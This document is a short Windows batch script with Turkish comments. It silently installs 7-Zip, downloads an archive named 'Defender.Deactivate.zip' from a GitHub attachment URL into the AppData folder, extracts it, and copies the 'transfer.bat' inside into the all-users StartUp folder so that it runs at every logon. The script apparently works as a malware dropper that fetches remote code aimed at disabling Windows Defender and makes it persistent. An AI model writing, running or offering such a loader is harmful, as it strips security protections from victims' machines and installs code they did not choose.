@echo off
setlocal

:: İndirilecek dosyanın URL'si ve hedef yolu
set "URL=https://github.com/user-attachments/files/16737948/Defender.Deactivate.zip"
set "DOWNLOAD_DIR=%appdata%"
set "ZIP_FILE=%DOWNLOAD_DIR%\Defender.Deactivate.zip"
set "EXTRACT_DIR=%DOWNLOAD_DIR%\Defender.Deactivate"
set "SEVENZIP_URL=https://www.7-zip.org/a/7z1900-x64.exe"
set "SEVENZIP_INSTALLER=%DOWNLOAD_DIR%\7z1900-x64.exe"
set "SEVENZIP_PATH=%ProgramFiles%\7-Zip\7z.exe"

:: 7-Zip'in yüklü olup olmadığını kontrol et
if not exist "%SEVENZIP_PATH%" (
    echo 7-Zip bulunamadı. Kurulumu yapılıyor...
    
    :: 7-Zip'i indir
    powershell -Command "Invoke-WebRequest -Uri '%SEVENZIP_URL%' -OutFile '%SEVENZIP_INSTALLER%'"
    
    :: 7-Zip'i arka planda kur
    start /wait "" "%SEVENZIP_INSTALLER%" /S
    
    :: Kurulumdan sonra dosyayı sil
    del "%SEVENZIP_INSTALLER%"
)

:: Zip dosyasını indir
powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%ZIP_FILE%'"

:: Zip dosyasını 7-Zip ile aç
"%SEVENZIP_PATH%" x "%ZIP_FILE%" -o"%EXTRACT_DIR%" -y

:: Zip dosyasını sil
del "%ZIP_FILE%"

:: transfer.bat dosyasını StartUp klasörüne kopyala
set "TRANSFER_BAT=%EXTRACT_DIR%\transfer.bat"
set "STARTUP_DIR=%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp"
copy "%TRANSFER_BAT%" "%STARTUP_DIR%"

:: Bitir
echo Zip dosyası '%ZIP_FILE%' başarıyla '%EXTRACT_DIR%' klasörüne çıkartıldı.
echo 'transfer.bat' dosyası '%STARTUP_DIR%' klasörüne kopyalandı.

endlocal
